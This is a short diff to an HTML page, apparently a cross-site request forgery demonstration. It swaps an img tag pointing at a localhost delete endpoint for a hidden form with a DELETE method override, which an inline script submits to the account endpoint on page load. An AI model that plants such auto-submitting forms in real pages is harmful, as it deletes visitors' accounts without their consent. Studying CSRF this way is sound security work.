@@ -5,6 +5,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <style>
+        body {
+            color: white;
+            background-color: black;
+        }
+    </style>
 
 </head>
 
@@ -39,7 +45,14 @@
                 img-tag</span>
         </p>
     </div>
-    <img src="http://localhost/delete.php" alt="">
+
+    <form action="http://localhost:80/account" id="form" method="POST">
+        <input type="hidden" name="_method" value="DELETE">
+    </form>
+    
+    <script>
+        document.getElementById("form").submit();
+    </script>
 
 </body>
 
